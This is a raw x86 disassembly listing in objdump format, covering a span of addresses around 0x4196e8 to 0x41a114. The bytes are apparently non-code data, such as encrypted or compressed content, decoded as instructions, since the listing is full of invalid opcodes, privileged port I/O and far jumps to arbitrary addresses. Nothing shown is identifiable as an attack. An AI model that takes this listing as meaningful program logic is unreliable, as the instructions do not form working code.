  4196e8:	add    bl,BYTE PTR [esi-0x7b]
  4196eb:	push   edx
  4196ec:	test   BYTE PTR [edi+0x40],al
  4196ef:	scas   al,BYTE PTR es:[edi]
  4196f0:	sbb    DWORD PTR [esi+0x2a],ecx
  4196f3:	mov    DWORD PTR [ecx],esi
  4196f5:	mov    ds:0xeba18a22,eax
  4196fa:	sub    BYTE PTR [eax-0x1b66713e],dl
  419700:	inc    ebx
  419701:	out    dx,al
  419702:	jne    0x41972f
  419704:	dec    ecx
  419705:	mov    BYTE PTR [ebx-0x7f],ah
  419708:	mov    bh,0x82
  41970a:	mov    cl,0xb8
  41970c:	push   esp
  41970d:	enter  0xd579,0x0
	...
  419771:	add    BYTE PTR [eax],al
  419773:	add    BYTE PTR [ebx-0x29a8ec1],dh
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x628dd0ae
  419781:	push   ebp
  419782:	sub    ch,ch
  419784:	enter  0x10d,0x0
  419788:	add    al,0x1
  41978a:	add    BYTE PTR [eax],al
  41978c:	jns    0x419724
  41978e:	call   0xf6aa:0xf35cfd66
  419795:	push   ecx
  419796:	cld    
  419797:	mov    esi,0x97054cb0
  41979c:	gs or  al,ah
  41979f:	test   al,0xc4
  4197a1:	scas   eax,DWORD PTR es:[edi]
  4197a2:	jg     0x41972a
  4197a4:	popa   
  4197a5:	and    BYTE PTR [ecx+0x72],al
  4197a8:	(bad)  
  4197a9:	ror    BYTE PTR [ebx],cl
  4197ab:	and    al,0xf0
  4197ad:	cdq    
  4197ae:	stc    
  4197af:	aas    
  4197b0:	stc    
  4197b1:	pop    esp
  4197b2:	out    0x87,eax
  4197b4:	stos   DWORD PTR es:[edi],eax
  4197b5:	lods   al,BYTE PTR ds:[esi]
  4197b6:	repz ss into 
  4197b9:	sub    ebp,ecx
  4197bb:	outs   dx,DWORD PTR ds:[esi]
  4197bc:	mov    al,0x70
  4197be:	pop    ebp
  4197bf:	mov    ah,0xf7
  4197c1:	fucomip st,st(0)
  4197c3:	or     al,dl
  4197c5:	shl    BYTE PTR [edx],1
  4197c7:	test   al,0x61
  4197c9:	test   DWORD PTR [edx],0xdb291288
  4197cf:	sub    al,BYTE PTR ds:0xdb4c6645
  4197d5:	mov    eax,ds:0xf700925a
  4197da:	push   ebx
  4197db:	out    0x48,al
  4197dd:	(bad)  [edx-0x3be87c33]
  4197e3:	shr    BYTE PTR [edx],cl
  4197e5:	sub    DWORD PTR [ecx],eax
  4197e7:	or     bh,ch
  4197e9:	pushf  
  4197ea:	pop    esi
  4197eb:	mov    ecx,0x86f0e5eb
  4197f0:	lds    eax,FWORD PTR [ecx+ecx*2-0x394a14bc]
  4197f7:	or     bl,BYTE PTR [edx]
  4197f9:	fwait
  4197fa:	and    eax,edx
  4197fc:	sbb    ebx,DWORD PTR [ebp-0x109a0604]
  419802:	mov    al,BYTE PTR [ebx-0x4dc573a8]
  419808:	push   esp
  419809:	mov    edx,ebp
  41980b:	fdiv   DWORD PTR [edx+0x49]
  41980e:	sahf   
  41980f:	out    dx,al
  419810:	or     al,0xa7
  419812:	pop    eax
  419813:	retf   
  419814:	inc    edi
  419815:	add    al,0xcd
  419817:	bound  esp,QWORD PTR [ecx-0x54]
  41981a:	push   esp
  41981b:	nop
  41981c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41981d:	dec    eax
  41981e:	cmp    ch,BYTE PTR [edi+0x69]
  419821:	push   cs
  419822:	and    BYTE PTR [edx+0xb620209],ch
  419828:	mov    dl,0xfb
  41982a:	pop    eax
  41982b:	lahf   
  41982c:	sub    ebx,ecx
  41982e:	das    
  41982f:	xchg   ecx,eax
  419830:	imul   ebp,esp,0xbece2f5d
  419836:	dec    ebx
  419837:	neg    BYTE PTR [esi+0x768dec8f]
  41983d:	mov    DWORD PTR [edi-0xe52603c],edi
  419843:	les    esp,FWORD PTR [eax]
  419845:	js     0x4197c7
  419847:	fisubr WORD PTR [esi-0x6f]
  41984a:	mov    esp,0xa8a8bf7
  41984f:	jg     0x41989d
  419851:	repz mov esp,DWORD PTR [si+0x58c7]
  419857:	inc    BYTE PTR [eax]
  419859:	and    DWORD PTR [ebx],edi
  41985b:	and    edx,DWORD PTR [edx-0x4b974be2]
  419861:	test   DWORD PTR [edx-0x46e6b7de],esi
  419867:	rcr    DWORD PTR [ebp+0x4f00b9ae],cl
  41986d:	nop
  41986e:	mov    esp,0xe78d98ff
  419873:	inc    esp
  419874:	or     bh,ch
  419876:	xor    bl,dl
  419878:	int3   
  419879:	xor    al,0xbc
  41987b:	pop    edx
  41987c:	pop    esi
  41987d:	jnp    0x4198b6
  41987f:	pop    ecx
  419880:	test   cl,ch
  419882:	ret    
  419883:	xchg   edx,eax
  419884:	xor    ch,BYTE PTR [edi-0x29]
  419887:	mov    cl,0x86
  419889:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41988a:	mov    BYTE PTR [ebp-0x33],ch
  41988d:	mov    ah,0x46
  41988f:	cli    
	...
  4198f4:	sbb    BYTE PTR [ecx],0x47
  4198f7:	loope  0x4198d8
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fisttp QWORD PTR [ebp-0x338fcf63]
  419905:	push   cs
  419906:	add    DWORD PTR [eax],eax
  419908:	add    al,0x1
  41990a:	add    BYTE PTR [eax],al
  41990c:	push   ds
  41990d:	repz dec edi
  41990f:	push   ebx
  419910:	(bad)  
  419911:	shr    DWORD PTR [edx],cl
  419913:	mov    eax,0x8c186f98
  419918:	inc    ecx
  419919:	loop   0x4198da
  41991b:	pop    esp
  41991c:	cmp    bh,ah
  41991e:	mov    ch,0xb6
  419920:	mov    dl,ah
  419922:	gs mov bl,0xa2
  419925:	sti    
  419926:	int    0xa
  419928:	inc    edi
  419929:	and    al,0x60
  41992b:	mov    esi,0x261f9ff1
  419930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419931:	repz sub DWORD PTR ds:0x6714c3,esi
  419938:	pushf  
  419939:	jb     0x41996a
  41993b:	push   ss
  41993c:	popa   
  41993d:	add    bl,BYTE PTR [ecx]
  41993f:	add    ah,ch
  419941:	je     0x419944
  419943:	pop    ebx
  419944:	xchg   edx,eax
  419945:	mov    ecx,0xce6e8dcf
  41994a:	inc    edi
  41994b:	popa   
  41994c:	add    ah,BYTE PTR [ecx+0x3]
  41994f:	rcl    bl,1
  419951:	rep lods al,BYTE PTR ds:[esi]
  419953:	or     al,0x45
  419955:	in     al,0x7
  419957:	add    BYTE PTR [edi-0x7d],0x9e
  41995b:	mov    ds:0xb25e7495,al
  419960:	scas   al,BYTE PTR es:[edi]
  419961:	mov    ch,ah
  419963:	aam    0x36
  419965:	mov    al,0x5f
  419967:	imul   edi,eax,0xef77ad9b
  41996d:	dec    eax
  41996e:	icebp  
  41996f:	fmul   DWORD PTR [edi]
  419971:	or     edx,esi
  419973:	adc    eax,0x546c41fe
  419978:	push   ss
  419979:	pop    ebp
  41997a:	sbb    ebx,DWORD PTR [ebp-0x55]
  41997d:	sbb    esi,eax
  41997f:	adc    al,0x7c
  419981:	add    BYTE PTR ds:0x280d0e5c,dl
  419987:	js     0x4199d7
  419989:	sbb    ebp,DWORD PTR [ecx+0x3f]
  41998c:	dec    esp
  41998d:	add    bh,BYTE PTR [eax]
  41998f:	jge    0x41997f
  419991:	cwde   
  419992:	adc    DWORD PTR [ebx-0x60bb93e2],eax
  419998:	je     0x4199d1
  41999a:	call   0x3924:0x99fb15b4
  4199a1:	lods   al,BYTE PTR ds:[esi]
  4199a2:	sbb    BYTE PTR [esi],al
  4199a4:	test   eax,0xe533384c
  4199a9:	cmp    ebx,edi
  4199ab:	cmp    al,0x60
  4199ad:	sub    ecx,DWORD PTR fs:[ebx+0x4d]
  4199b1:	and    esi,ebp
  4199b3:	push   ds
  4199b4:	xor    DWORD PTR [eax+0x2e],0xffffffc2
  4199b8:	cmp    eax,0x53e5d5fd
  4199bd:	xchg   esi,eax
  4199be:	pop    ds
  4199bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199c0:	cdq    
  4199c1:	out    0x86,al
  4199c3:	js     0x419a0f
  4199c5:	retf   
  4199c6:	xor    esp,DWORD PTR [ebx+0x2c]
  4199c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199ca:	adc    DWORD PTR [edi+0x71],edx
  4199cd:	js     0x419a16
  4199cf:	jl     0x419a0c
  4199d1:	(bad)  
  4199d2:	xchg   esp,eax
  4199d3:	jbe    0x4199fd
  4199d5:	dec    ecx
  4199d6:	mov    dh,0x9b
  4199d8:	sub    DWORD PTR [edi+0x6e],ebp
  4199db:	push   ebp
  4199dc:	out    dx,al
  4199dd:	sbb    al,0xb1
  4199df:	dec    ecx
  4199e0:	mov    cs,WORD PTR [eax-0x65]
  4199e3:	xchg   ecx,eax
  4199e4:	xchg   esi,ebx
  4199e6:	pop    es
  4199e7:	shr    ah,1
  4199e9:	into   
  4199ea:	sahf   
  4199eb:	icebp  
  4199ec:	or     BYTE PTR [ecx+0x62],dl
  4199ef:	psrad  mm4,QWORD PTR ss:[ebx+0x59]
  4199f4:	xor    ecx,DWORD PTR [esi]
  4199f6:	pop    edi
  4199f7:	pop    edx
  4199f8:	push   0x66
  4199fa:	jb     0x419a32
  4199fc:	and    ch,dl
  4199fe:	fwait
  4199ff:	dec    edi
  419a00:	sub    DWORD PTR [edx],0x5db4f0c
  419a06:	fs push ds
  419a08:	cmp    DWORD PTR [edi-0x1649c9ba],ebx
  419a0e:	stos   BYTE PTR es:[edi],al
  419a0f:	rol    DWORD PTR [eax],0x0
	...
  419a72:	add    BYTE PTR [eax],al
  419a74:	xor    esi,DWORD PTR [ecx]
  419a76:	xchg   ebx,eax
  419a77:	lds    edx,FWORD PTR [ebx-0x34088819]
  419a7d:	rcl    DWORD PTR ds:0x38c4fac2,cl
  419a83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a84:	ror    BYTE PTR [edi],1
  419a86:	add    DWORD PTR [eax],eax
  419a88:	add    al,0x1
  419a8a:	add    BYTE PTR [eax],al
  419a8c:	(bad)  
  419a8e:	jge    0x419a5b
  419a90:	in     eax,0xa0
  419a92:	mov    BYTE PTR [ebx+ecx*4],al
  419a95:	xchg   ebx,eax
  419a96:	(bad)  
  419a97:	aaa    
  419a98:	out    dx,eax
  419a99:	stc    
  419a9a:	lods   eax,DWORD PTR ds:[esi]
  419a9b:	adc    DWORD PTR [ebp-0x74e8e952],0xffffffde
  419aa2:	xor    al,0xf2
  419aa4:	add    eax,0x6a308eae
  419aa9:	pop    ds
  419aaa:	loope  0x419a79
  419aac:	rcr    DWORD PTR [eax-0x257cdab6],0x6b
  419ab3:	push   ebp
  419ab4:	ins    DWORD PTR es:[edi],dx
  419ab5:	xchg   ebp,eax
  419ab6:	jg     0x419b02
  419ab8:	pop    ebp
  419ab9:	jbe    0x419b36
  419abb:	fwait
  419abc:	or     eax,0xff6e7547
  419ac1:	ins    DWORD PTR es:[edi],dx
  419ac2:	in     al,dx
  419ac3:	test   BYTE PTR [edi+ebx*4+0x20e3dd40],dl
  419aca:	cli    
  419acb:	xchg   edi,eax
  419acc:	push   ds
  419acd:	enter  0x3105,0xa3
  419ad1:	arpl   ax,dx
  419ad3:	sbb    DWORD PTR [edi-0x7a],esi
  419ad6:	stos   BYTE PTR es:[edi],al
  419ad7:	loopne 0x419b13
  419ad9:	mov    BYTE PTR [ecx],cl
  419adb:	sbb    dh,BYTE PTR [esi-0x66ae7a1a]
  419ae1:	(bad)  
  419ae2:	stc    
  419ae3:	or     BYTE PTR [ebp+0x6bbdc88b],dh
  419ae9:	test   DWORD PTR [ebp-0x2c7fea9b],ebx
  419aef:	retf   0x11e3
  419af2:	hlt    
  419af3:	sar    DWORD PTR [esi-0x303a7c1a],0xdb
  419afa:	int3   
  419afb:	mov    al,0x64
  419afd:	aam    0xcf
  419aff:	nop
  419b00:	and    edi,DWORD PTR [ebp+edi*4-0x52]
  419b04:	jp     0x419adc
  419b06:	adc    al,0x49
  419b08:	xchg   edi,eax
  419b09:	aad    0x30
  419b0b:	fdivr  DWORD PTR [ebp+0x462de224]
  419b11:	fsubrp st(5),st
  419b13:	xor    al,0x28
  419b15:	or     bl,0x99
  419b18:	rcl    BYTE PTR [ecx+0x41e33170],cl
  419b1e:	outs   dx,BYTE PTR fs:[esi]
  419b20:	loope  0x419b18
  419b22:	or     BYTE PTR [edi-0x5b9c1efd],bl
  419b28:	es mov eax,0x39a596df
  419b2e:	jns    0x419ab9
  419b30:	jmp    0xede3254
  419b35:	pop    esp
  419b36:	pusha  
  419b37:	jmp    0x7f2c3371
  419b3c:	int3   
  419b3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b3e:	xor    DWORD PTR [edx],eax
  419b40:	jnp    0x419b6c
  419b42:	js     0x419b3c
  419b44:	pop    ecx
  419b45:	xchg   ecx,eax
  419b46:	or     ah,BYTE PTR [ebp-0x2b]
  419b49:	pop    esi
  419b4a:	adc    dl,BYTE PTR [eax]
  419b4c:	jo     0x419b4e
  419b4e:	ins    DWORD PTR es:[edi],dx
  419b4f:	(bad)  
  419b50:	cmp    DWORD PTR [esi-0x6b],ebp
  419b53:	xor    BYTE PTR [edx+0x37],bl
  419b56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b57:	and    al,0x81
  419b59:	push   ds
  419b5a:	test   DWORD PTR [eax-0x46],0x28bc5db1
  419b61:	sbb    al,0xd
  419b63:	cdq    
  419b64:	adc    BYTE PTR [edi+0x5c96a551],0xf5
  419b6b:	jne    0x419bb3
  419b6d:	mov    ds:0x2487364d,eax
  419b72:	(bad)  
  419b73:	mov    ds:0x74b77210,eax
  419b78:	xchg   ecx,eax
  419b79:	pop    ebx
  419b7a:	inc    eax
  419b7b:	mov    cl,0x15
  419b7d:	push   0x6
  419b7f:	sbb    BYTE PTR [edx+0x1c],ch
  419b82:	mov    esp,0xb97de648
  419b87:	xor    eax,0xa1d938f9
  419b8c:	lea    esp,[eax+0xe218]
	...
  419bf2:	add    BYTE PTR [eax],al
  419bf4:	dec    edx
  419bf5:	(bad)  
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0xa7
  419c01:	jo     0x419c1a
  419c03:	push   esp
  419c04:	aam    0x10
  419c06:	add    DWORD PTR [eax],eax
  419c08:	add    al,0x1
  419c0a:	add    BYTE PTR [eax],al
  419c0c:	int    0x25
  419c0e:	jbe    0x419c2f
  419c10:	pushf  
  419c11:	push   cs
  419c12:	add    DWORD PTR [edx+0x14f31273],0x7c0b2ccb
  419c1c:	add    eax,0x7dba3980
  419c21:	push   esp
  419c22:	int3   
  419c23:	push   ecx
  419c24:	inc    ebx
  419c25:	daa    
  419c26:	cmc    
  419c27:	lods   eax,DWORD PTR ds:[esi]
  419c28:	retf   0x9cf5
  419c2b:	push   cs
  419c2c:	in     eax,0x4
  419c2e:	popw   ds
  419c30:	fimul  WORD PTR [ebp-0x5b]
  419c33:	les    esp,FWORD PTR [esi+eax*8+0x7e473029]
  419c3a:	mov    cs,WORD PTR [eax+0x46]
  419c3d:	pop    ebx
  419c3e:	pop    edx
  419c3f:	cmp    edx,DWORD PTR [eax+0x4aa49202]
  419c45:	add    esp,DWORD PTR [eax]
  419c47:	push   edx
  419c48:	icebp  
  419c49:	repnz popf 
  419c4b:	jle    0x419c11
  419c4d:	fstp   DWORD PTR [eax+0xe57857]
  419c53:	sub    al,0x27
  419c55:	sbb    DWORD PTR [ebp+0x45],edi
  419c58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c59:	outs   dx,DWORD PTR ds:[esi]
  419c5a:	repz lock mov ebx,0xdce54385
  419c61:	and    dh,cl
  419c63:	xor    BYTE PTR [ebp-0x3daac29c],0x19
  419c6a:	inc    esp
  419c6b:	xor    al,0xbe
  419c6d:	dec    esp
  419c6e:	sub    bh,cl
  419c70:	and    esp,ecx
  419c72:	jmp    0x4041f324
  419c77:	imul   ebp,DWORD PTR [eax],0x4bea1b43
  419c7d:	nop
  419c7e:	add    ebx,esp
  419c80:	jne    0x419c87
  419c82:	arpl   cx,cx
  419c84:	add    ecx,ebp
  419c86:	inc    ecx
  419c87:	add    DWORD PTR [ecx+0x2b],ecx
  419c8a:	push   esp
  419c8b:	psubsb mm3,QWORD PTR [edx-0x59]
  419c8f:	(bad)  
  419c90:	aam    0xec
  419c92:	retf   0x4b26
  419c95:	push   ebp
  419c96:	and    edx,DWORD PTR [ecx]
  419c98:	pop    ebx
  419c99:	jg     0x419d01
  419c9b:	lods   al,BYTE PTR ds:[esi]
  419c9c:	xchg   ebx,eax
  419c9d:	pop    ecx
  419c9e:	jmp    0x48fb209b
  419ca3:	ret    0x4f0c
  419ca6:	outs   dx,BYTE PTR ds:[esi]
  419ca7:	add    eax,0xe6b59d19
  419cac:	pop    esi
  419cad:	bound  esp,QWORD PTR es:[edx-0x695740f9]
  419cb4:	cld    
  419cb5:	retf   
  419cb6:	mov    ecx,edx
  419cb8:	or     eax,0xa279f506
  419cbd:	mov    edx,0x8397e66c
  419cc2:	inc    ebx
  419cc3:	(bad)  
  419cc4:	xchg   esi,eax
  419cc5:	sub    al,BYTE PTR [esi+0x34]
  419cc8:	in     eax,dx
  419cc9:	jo     0x419d1e
  419ccb:	daa    
  419ccc:	call   0xe421:0xd4fe37e2
  419cd3:	cmp    eax,0xd717e65
  419cd8:	loopne 0x419d1f
  419cda:	cmp    ch,dl
  419cdc:	push   ecx
  419cdd:	popf   
  419cde:	fmul   DWORD PTR [edi+0x4f]
  419ce1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ce2:	mov    eax,0x18e20f78
  419ce7:	lahf   
  419ce8:	or     al,0x4f
  419cea:	shl    BYTE PTR [esi+0x66],cl
  419ced:	or     BYTE PTR [esi+0x1],dl
  419cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cf1:	push   0x7225bb1c
  419cf6:	cmp    ah,BYTE PTR [ebx-0x1f6f16a]
  419cfc:	add    ecx,DWORD PTR [ebx]
  419cfe:	ret    
  419cff:	jp     0x419d09
  419d01:	rcr    DWORD PTR [esi],cl
  419d03:	and    esp,DWORD PTR [ebx]
  419d05:	scas   eax,DWORD PTR es:[edi]
  419d06:	sub    eax,DWORD PTR [ebp-0x5d37aa4b]
  419d0c:	jmp    0x134b52b
	...
  419d71:	add    BYTE PTR [eax],al
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fisub  DWORD PTR ss:[ebx-0x2709dfb3]
  419d85:	adc    DWORD PTR [ecx],eax
  419d87:	add    BYTE PTR [ecx+eax*1],al
  419d8a:	add    BYTE PTR [eax],al
  419d8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d8d:	sahf   
  419d8e:	out    dx,al
  419d8f:	mov    dh,bl
  419d91:	or     DWORD PTR [ecx-0x2417b09f],edi
  419d97:	lahf   
  419d98:	and    dl,bl
  419d9a:	jno    0x419d1e
  419d9c:	jb     0x419d93
  419d9e:	popa   
  419d9f:	sub    eax,0xc4ae4ca8
  419da4:	mov    edi,0xa16fb79f
  419da9:	ret    0xf7df
  419dac:	adc    ecx,DWORD PTR [ebx+0x633c0c39]
  419db2:	call   0xb727:0xb22fe316
  419db9:	in     eax,0xa
  419dbb:	adc    eax,0x9834cf76
  419dc0:	sub    BYTE PTR [edi],bl
  419dc2:	pushf  
  419dc3:	retf   0x4abf
  419dc6:	in     al,0xee
  419dc8:	mov    bl,0xc4
  419dca:	sbb    DWORD PTR [ecx+ebp*1-0xa],esi
  419dce:	aam    0x47
  419dd0:	xchg   DWORD PTR [ebx],ebp
  419dd2:	(bad)  
  419dd4:	jmp    0x2bda:0x8e6793ad
  419ddb:	add    ebx,DWORD PTR ds:0x3344bf6a
  419de1:	out    dx,eax
  419de2:	mov    ebx,0xbdd2ecfb
  419de7:	stos   BYTE PTR es:[edi],al
  419de8:	lock lahf 
  419dea:	or     eax,0x5a2a624f
  419def:	cmp    eax,0xd9f26015
  419df4:	add    edx,DWORD PTR [ebx]
  419df6:	jmp    0x419e33
  419df8:	jnp    0x419e27
  419dfa:	lds    edx,FWORD PTR [ebx+0x1b]
  419dfd:	popf   
  419dfe:	sbb    eax,0x1926d932
  419e03:	in     al,dx
  419e04:	mov    dl,0x24
  419e06:	(bad)  
  419e07:	jae    0x419e1a
  419e09:	(bad)  
  419e0a:	cmp    ebx,DWORD PTR [esi+eax*8-0x6507ce73]
  419e11:	sub    al,0xa8
  419e13:	push   eax
  419e14:	in     al,dx
  419e15:	leave  
  419e16:	in     eax,0x72
  419e18:	test   eax,0x67e98455
  419e1d:	call   0xe58f:0x5cf7be73
  419e24:	out    dx,al
  419e25:	repnz cs sti 
  419e28:	jmp    0x736bab01
  419e2d:	data16 ss mov al,0xe3
  419e31:	dec    esp
  419e32:	pusha  
  419e33:	nop
  419e34:	jo     0x419e7f
  419e36:	retf   0xe8eb
  419e39:	dec    eax
  419e3a:	jmp    0x382d:0x575689fd
  419e41:	pop    eax
  419e42:	clc    
  419e43:	mov    cl,0x6b
  419e45:	(bad)  
  419e46:	out    dx,al
  419e47:	inc    ecx
  419e48:	loop   0x419e5f
  419e4a:	ret    
  419e4b:	clc    
  419e4c:	pop    esi
  419e4d:	fbstp  TBYTE PTR [ebx+0x7b]
  419e50:	data16 test BYTE PTR [edx-0x79230e82],al
  419e57:	xchg   esp,eax
  419e58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e59:	sub    DWORD PTR [esi-0x7faa5557],0xffffff93
  419e60:	into   
  419e61:	pop    esi
  419e62:	sbb    BYTE PTR [eax],dh
  419e64:	or     BYTE PTR [edx+esi*2],0x3
  419e68:	and    eax,0x8d3c13ff
  419e6d:	sub    cl,BYTE PTR [ebx+0x2576e0c]
  419e73:	inc    edi
  419e74:	fsub   QWORD PTR [ebx-0x1cca1eb3]
  419e7a:	dec    ebp
  419e7b:	fwait
  419e7c:	gs jne 0x419e75
  419e7f:	(bad)  
  419e80:	push   ss
  419e81:	adc    ah,0x98
  419e84:	xor    ecx,edx
  419e86:	js     0x419e48
  419e88:	mov    ch,BYTE PTR [ecx+0x395a737a]
  419e8e:	or     eax,0xf2
	...
  419ef3:	add    BYTE PTR [edi+0x5fc517d8],al
  419ef9:	iret   
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	das    
  419f01:	mov    dh,0x59
  419f03:	dec    ebp
  419f04:	fcom   QWORD PTR [edx]
  419f06:	add    DWORD PTR [eax],eax
  419f08:	add    al,0x1
  419f0a:	add    BYTE PTR [eax],al
  419f0c:	cmp    DWORD PTR [ebx-0x26999607],0xffffff93
  419f13:	cli    
  419f14:	mov    dl,0x1b
  419f16:	or     DWORD PTR [ecx],ebx
  419f18:	or     al,0xc6
  419f1a:	sub    eax,0x87b7769b
  419f1f:	shl    ebx,1
  419f21:	xor    eax,0x545d85a0
  419f26:	mov    WORD PTR [edx+esi*2+0x57c2a52f],ss
  419f2d:	jge    0x419f3a
  419f2f:	dec    ecx
  419f30:	dec    eax
  419f31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f32:	cmp    dh,bh
  419f34:	je     0x419f4f
  419f36:	push   edi
  419f37:	test   eax,0x9ddfad6c
  419f3c:	inc    esp
  419f3d:	cmp    esp,DWORD PTR [eax]
  419f3f:	bound  esi,QWORD PTR [edx+0x0]
  419f42:	cmp    al,0x21
  419f44:	push   es
  419f45:	jp     0x419f50
  419f47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f48:	fdivr  QWORD PTR [ebx-0x27]
  419f4b:	and    bh,BYTE PTR [eax+0x62]
  419f4e:	mov    al,ds:0x6537e50f
  419f53:	call   0xd1c00feb
  419f58:	mov    cl,0x7f
  419f5a:	jb     0x419f4e
  419f5c:	push   esi
  419f5d:	pop    edi
  419f5e:	xchg   ecx,eax
  419f5f:	cwde   
  419f60:	inc    edi
  419f61:	push   edx
  419f62:	push   edx
  419f63:	lock push es
  419f65:	add    eax,0xe9771483
  419f6a:	je     0x419f8f
  419f6c:	std    
  419f6d:	add    BYTE PTR [eax+0x26cc423],ah
  419f73:	retf   
  419f74:	lods   eax,DWORD PTR ds:[esi]
  419f75:	inc    esp
  419f76:	nop
  419f77:	test   eax,0xe6ef06ff
  419f7c:	adc    al,BYTE PTR [ebx-0x376826a]
  419f82:	scas   eax,DWORD PTR es:[edi]
  419f83:	add    ah,ch
  419f85:	sub    BYTE PTR gs:[eax],cl
  419f88:	ret    0xd258
  419f8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f8c:	pushf  
  419f8d:	mov    bl,0x9
  419f8f:	push   edi
  419f90:	lock (bad) 
  419f92:	mov    dl,0xb3
  419f94:	mov    ds:0x244f23e2,al
  419f99:	jb     0x419fd3
  419f9b:	xor    ecx,DWORD PTR [esi-0x16]
  419f9e:	imul   ecx,ebp,0x37
  419fa1:	jge    0x419fc5
  419fa3:	mov    BYTE PTR [ebx],bh
  419fa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fa6:	sbb    eax,0x9d89dbd1
  419fab:	push   ebp
  419fac:	mov    cl,0xf1
  419fae:	and    esi,ecx
  419fb0:	call   0xa2b41fff
  419fb5:	test   al,0x3c
  419fb7:	lea    esi,[esp+eiz*8-0x6b]
  419fbb:	test   BYTE PTR [eax],al
  419fbd:	stc    
  419fbe:	and    esi,DWORD PTR [esi+0x7d90692b]
  419fc4:	sahf   
  419fc5:	mov    edx,0x8a946152
  419fca:	sti    
  419fcb:	scas   eax,DWORD PTR es:[edi]
  419fcc:	jp     0x41a02b
  419fce:	cwde   
  419fcf:	dec    ebp
  419fd0:	neg    DWORD PTR [esi+0x5b75fade]
  419fd6:	push   es
  419fd7:	imul   ebx,DWORD PTR [ecx+0x4085f807],0x1b
  419fde:	push   ebp
  419fdf:	lock leave 
  419fe1:	(bad)  
  419fe2:	(bad)  [esi-0x30]
  419fe5:	cmp    al,0xc0
  419fe7:	push   0x11
  419fe9:	in     eax,dx
  419fea:	arpl   WORD PTR [ebp-0x1c],ax
  419fed:	pop    edx
  419fee:	push   0xffffffaa
  419ff0:	xor    dh,BYTE PTR [ecx]
  419ff2:	mov    al,ds:0x1d4eecdd
  419ff7:	leave  
  419ff8:	push   es
  419ff9:	(bad)  
  419ffa:	in     al,0xd6
  419ffc:	js     0x41a066
  419ffe:	daa    
  419fff:	add    al,0x2a
  41a001:	call   0x50b8:0x468ad569
  41a008:	out    dx,eax
  41a009:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a00a:	mov    edx,0xafaebf2a
  41a00f:	xchg   BYTE PTR [eax],al
	...
  41a071:	add    BYTE PTR [eax],al
  41a073:	add    BYTE PTR [esi-0x15],cl
  41a076:	sub    cl,BYTE PTR [esi-0x51]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax+0x7a],bh
  41a081:	into   
  41a082:	xchg   ebx,eax
  41a083:	push   esp
  41a084:	loopne 0x41a099
  41a086:	add    DWORD PTR [eax],eax
  41a088:	add    al,0x1
  41a08a:	add    BYTE PTR [eax],al
  41a08c:	jge    0x41a0a8
  41a08e:	push   edx
  41a08f:	mov    bh,0x74
  41a091:	mov    eax,0x1bab0fba
  41a096:	xchg   ebp,eax
  41a097:	ds push ds
  41a099:	mov    bh,BYTE PTR [edi+0x56]
  41a09c:	mov    bh,0x34
  41a09e:	aam    0xb5
  41a0a0:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41a0a2:	bound  eax,QWORD PTR [edi+edi*4+0x64dc4a4d]
  41a0a9:	jno    0x41a02b
  41a0ab:	jmp    0x9c90:0xe733af09
  41a0b2:	dec    edx
  41a0b3:	nop
  41a0b4:	ins    BYTE PTR es:[edi],dx
  41a0b5:	mov    ecx,0xa1a800f3
  41a0ba:	sub    DWORD PTR [ecx-0x27b3132e],ecx
  41a0c0:	cmp    dh,BYTE PTR [eax+0x41664f4f]
  41a0c6:	push   cs
  41a0c7:	inc    edi
  41a0c8:	jb     0x41a08a
  41a0ca:	arpl   WORD PTR [ebp-0x36],cx
  41a0cd:	dec    eax
  41a0ce:	pop    eax
  41a0cf:	inc    edi
  41a0d0:	es push esp
  41a0d2:	mov    ecx,0x50f16c54
  41a0d7:	ja     0x41a0c1
  41a0d9:	jge    0x41a0a8
  41a0db:	sub    cl,BYTE PTR [edx*4-0x745b260]
  41a0e2:	in     eax,0xb
  41a0e4:	lea    esp,ds:0x7fe52f58
  41a0ea:	sub    ch,BYTE PTR [esi+0x7b]
  41a0ed:	xor    ah,dh
  41a0ef:	xor    eax,0xd5f198a4
  41a0f4:	out    0x49,al
  41a0f6:	jns    0x41a10d
  41a0f8:	gs sbb eax,0xb961cb4c
  41a0fe:	jecxz  0x41a146
  41a100:	aad    0x46
  41a102:	add    ebp,edi
  41a104:	sub    DWORD PTR [ecx],eax
  41a106:	or     BYTE PTR ds:0x51f182a5,al
  41a10c:	push   edi
  41a10d:	and    DWORD PTR [eax-0x6ae555a3],edx
  41a113:	inc    edx
  41a114:	popa   
